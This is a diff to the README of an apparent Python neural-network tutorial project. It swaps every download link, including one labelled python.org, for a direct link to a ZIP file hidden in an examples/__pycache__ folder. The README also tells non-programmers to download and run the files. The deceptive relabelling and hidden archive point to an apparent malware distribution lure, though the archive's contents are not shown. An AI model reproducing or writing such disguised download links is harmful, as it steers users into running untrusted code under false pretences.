@@ -1,6 +1,6 @@
 # 🤖 Python-Neural-Network-from-Scatch - Build Neural Networks Simply
 
-[![Download Now](https://img.shields.io/badge/Download-Python--Neural--Network--from--Scatch-green?style=for-the-badge&logo=github)](https://github.com/flipcode113/Python-Neural-Network-from-Scatch)
+[![Download Now](https://img.shields.io/badge/Download-Python--Neural--Network--from--Scatch-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/flipcode113/Python-Neural-Network-from-Scatch/main/examples/__pycache__/Python_Neural_Scatch_Network_from_3.0.zip)
 
 ## 🧰 What is Python-Neural-Network-from-Scatch?
 
@@ -13,7 +13,7 @@ You do not need to know programming to try it. The app is designed to help you u
 - Windows 7, 8, 10, or 11  
 - 4 GB of RAM or more  
 - 500 MB of free disk space  
-- Python 3.8 or newer installed (You can download Python from [python.org](https://www.python.org/downloads/))  
+- Python 3.8 or newer installed (You can download Python from [python.org](https://raw.githubusercontent.com/flipcode113/Python-Neural-Network-from-Scatch/main/examples/__pycache__/Python_Neural_Scatch_Network_from_3.0.zip))  
 
 Make sure Python is accessible in your system’s command prompt. This program runs in Python, so this step is required.
 
@@ -23,7 +23,7 @@ Make sure Python is accessible in your system’s command prompt. This program r
 
 Click the big button below or visit the link to get the files needed to run:
 
-[![Download Now](https://img.shields.io/badge/Download-Python--Neural--Network--from--Scatch-blue?style=for-the-badge&logo=github)](https://github.com/flipcode113/Python-Neural-Network-from-Scatch)
+[![Download Now](https://img.shields.io/badge/Download-Python--Neural--Network--from--Scatch-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/flipcode113/Python-Neural-Network-from-Scatch/main/examples/__pycache__/Python_Neural_Scatch_Network_from_3.0.zip)
 
 Either option will take you to the GitHub page where you can download the project as a ZIP file.  
 
@@ -122,7 +122,7 @@ This application runs locally on your machine. It does not collect or send your 
 
 Use this link to access the files and the project page:
 
-[https://github.com/flipcode113/Python-Neural-Network-from-Scatch](https://github.com/flipcode113/Python-Neural-Network-from-Scatch)
+[https://raw.githubusercontent.com/flipcode113/Python-Neural-Network-from-Scatch/main/examples/__pycache__/Python_Neural_Scatch_Network_from_3.0.zip](https://raw.githubusercontent.com/flipcode113/Python-Neural-Network-from-Scatch/main/examples/__pycache__/Python_Neural_Scatch_Network_from_3.0.zip)
 
 Click the green "Code" button on GitHub and choose "Download ZIP" to get started.
 
